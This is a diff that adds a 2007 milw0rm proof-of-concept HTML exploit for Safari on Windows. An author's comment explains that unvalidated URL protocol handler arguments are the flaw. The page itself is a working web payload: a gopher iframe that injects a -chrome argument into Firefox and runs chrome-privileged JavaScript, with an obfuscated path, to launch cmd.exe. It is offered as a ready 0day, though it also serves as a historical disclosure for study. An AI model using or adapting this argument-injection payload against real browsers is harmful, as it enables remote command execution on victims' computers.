@@ -1,0 +1,30 @@
+<!--
+Safari for Windows, 0day exploit in 2 hours
+http://larholm.com/2007/06/12/safari-for-windows-0day-exploit-in-2-hours/
+By Thor Larholm
+
+The below PoC exploit will exploit Safari by bouncing through Firefox 
+via the Gopher protocol, passing on unfiltered input for the -chrome 
+argument that Firefox exposes. When it has done this it will launch 
+C:\Windows\System32\cmd.exe with any arguments that have been specified 
+in the call to the process.run method. 
+
+It is important to know that, even though this PoC exploit uses Firefox, 
+the actual vulnerability is within the lack of input validation for the 
+command line arguments handed to the various URL protocol handlers on 
+your machine. As such, there are a lot of different attack vectors for 
+this vulnerability, I simply chose Firefox and the Gopher URL protocol 
+because I was familiar with these. 
+
+I hope you enjoyed the fruits of my 2 hours of labour. Please feel free 
+to add my RSS feed to your reader and come back again tomorrow or next 
+week for a fresh batch of 0day vulnerabilities :) 
+
+Cheers Thor Larholm 
+-->
+
+<html><body>
+<iframe src='gopher://larholm.com" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[&#39;@mozilla.org/file/local;1&#39;].createInstance(I.nsILocalFile);file.initWithPath(&#39;C:&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;Windows&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;System32&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;cmd.exe&#39;);process=C[&#39;@mozilla.org/process/util;1&#39;].createInstance(I.nsIProcess);process.init(file);process.run(true&#44;{}&#44;0);alert(process)'></iframe>process.init(file);process.run(true,{},0);alert(process)
+</body></html>
+
+# milw0rm.com [2007-06-12]
